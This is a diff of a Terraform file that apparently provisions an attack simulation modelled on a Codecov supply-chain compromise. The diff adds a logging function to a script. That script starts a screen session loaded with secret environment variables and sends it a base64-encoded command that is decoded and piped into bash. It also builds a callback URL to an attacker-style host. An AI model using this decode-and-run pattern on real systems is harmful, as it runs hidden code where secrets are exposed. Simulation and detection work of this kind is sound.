@@ -5,6 +5,11 @@ locals {
     env_secrets=join(" ", var.env_secrets)
     callback_url = var.use_ssl == true ? "https://${local.host_ip}:${local.host_port}" : "http://${local.host_ip}:${local.host_port}"
     command_payload=<<-EOT
+    LOGFILE=/tmp/attacker_exec_git_codecov.log
+    function log {
+        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
+        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
+    }
     rm -rf /tmp/repo
     mkdir -p /tmp/repo
     cd /tmp/repo
@@ -31,7 +36,7 @@ locals {
         sleep 10
     done
     log "git: $(which git)"
-    screen -d -Logfile /tmp/codecov.log -S codecov -m env -i LOGFILE=$LOGFILE PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ${local.env_secrets} /bin/bash --noprofile --norc
+    screen -d -Logfile /tmp/codecov.log -S codecov -m env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ${local.env_secrets} /bin/bash --noprofile --norc
     screen -S codecov -X colon "logfile flush 0^M"
     log 'sending screen command: ${local.command_payload}';
     screen -S codecov -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
